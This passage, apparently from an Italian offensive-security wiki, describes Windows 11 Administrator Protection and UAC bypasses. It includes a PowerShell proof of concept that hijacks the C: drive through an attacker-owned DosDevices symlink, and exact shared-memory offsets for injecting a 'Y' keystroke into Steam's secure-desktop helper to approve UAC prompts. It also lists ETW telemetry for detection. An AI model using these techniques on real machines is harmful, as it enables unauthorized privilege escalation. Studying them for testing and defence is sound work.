> Ad agosto 2026, Microsoft documenta ancora Administrator Protection come **anteprima Insider**: il rollout di ottobre 2025 è stato annullato e pianificato per una data successiva. Prima di testare queste chain, verifica che **Admin Approval Mode with Administrator protection** sia effettivamente abilitato e che il dispositivo sia stato riavviato; la sola stringa di versione standard 25H2 non dimostra che la funzionalità sia attiva.<sup>[[10]](#references)</sup>

Per l'intera superficie di attacco `RAiLaunchAdminProcess` / UIAccess nelle build di anteprima di Windows 11 25H2, consulta la pagina dedicata:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” usa token shadow-admin con mappe `\Sessions\0\DosDevices/<LUID>` per sessione. La directory viene creata al bisogno da `SeGetTokenDeviceMap` alla prima risoluzione di `\??`. Se l'attaccante impersona il token shadow-admin al livello **SecurityIdentification**, la directory viene creata con l'attaccante come **proprietario** (eredita `CREATOR OWNER`), consentendo link alle lettere di unità che hanno precedenza su `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Passaggi:**

1. Da una sessione con privilegi bassi, chiama `RAiProcessRunOnce` per avviare un `runonce.exe` shadow-admin senza prompt.
2. Duplica il suo token primario in un token di **identificazione** e impersonalo mentre apri `\??` per forzare la creazione di `\Sessions\0\DosDevices/<LUID>` con l'attaccante come proprietario.
3. Crea lì un symlink `C:` che punti a un percorso di archiviazione controllato dall'attaccante; gli accessi successivi al file system in quella sessione risolveranno `C:` nel percorso dell'attaccante, consentendo un DLL/file hijack senza prompt.

**PoC PowerShell (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Sugli host di anteprima, Administrator Protection registra approvazioni e insuccessi come eventi ETW **15031** e **15032** nel provider `Microsoft-Windows-LUA`. Gli eventi includono il SID del richiedente, il percorso dell’applicazione, l’esito, l’account amministratore gestito e il metodo di autenticazione: i ripetuti tentativi di exploit o i tentativi falliti di interagire con l’interfaccia non sono quindi privi di telemetria.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Input del desktop sicuro inoltrato tramite un ring di memoria condivisa scrivibile

Un helper del desktop sicuro può compromettere il prompt UAC se un utente con integrità media può scrivere nel suo IPC di input. Nel design Steam segnalato, `IClientSecureDesktop::BStartStreaming` avvia `secure_desktop_capture.exe` come SYSTEM su `winsta0\winlogon`. Espone `Global\SecureDesktopInput_mem-IPCWrapper` con accesso `GENERIC_ALL` per gli utenti; l’helper legge le voci del ring e chiama `SendInput` sul desktop sicuro. È diverso da UIAccess o dalla modifica di `PromptOnSecureDesktop`: l’input viene inoltrato da un processo già in esecuzione su quel desktop. Consulta il [bootstrap IPC del servizio](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc) per sapere come il client raggiunge questo handler. <sup>[[15]](#references)[[16]](#references)</sup>

Il ring ha 128 slot da 173 byte. I contatori di scrittura e lettura si trovano rispettivamente agli offset `0x414` e `0x418`, mentre lo slot `N` si trova a `0x41c + 173*N`. Imposta il primo byte dello slot a `0` per indicare testo in chiaro, copia subito dopo una struttura Windows `INPUT` di 40 byte, quindi incrementa il contatore di scrittura. Per un amministratore con integrità media che visualizza un prompt di consenso, l’evento key-down/key-up del tasto `Y` può attivare il controllo UAC affermativo dopo aver avviato un eseguibile che richiede l’elevazione; non può rispondere a un prompt di credenziali per un utente standard. **Il passaggio di consenso resta importante**: l’helper inoltra l’input solo dopo che l’utente ha approvato il prompt `InputEnabled` per il periodo di autorizzazione corrente di 90 giorni. Una mappatura leggibile/scrivibile, da sola, non dimostra che l’input raggiunga il prompt; confronta il contatore di lettura prima e dopo un test controllato. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Come funziona il Controllo dell'account utente](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Raccolta di tecniche di bypass UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner di compatibilità e launcher per bypass UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adotta l'IA per generare backdoor PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: sfruttamento 0-day contro obiettivi governativi del Sud-est asiatico](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypass della protezione amministratore di Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC tramite l'attività SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Bypass UnifiedConsent, TabTip e Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Protezione amministratore](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Chiamare server RPC locali di Windows da .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte potenzia CoolClient con un rootkit per il kernel di Windows firmato](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: un trojan Windows completamente invisibile, creato per spiare, rubare e terrorizzare](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Girare la Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – PoC di Turning the Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
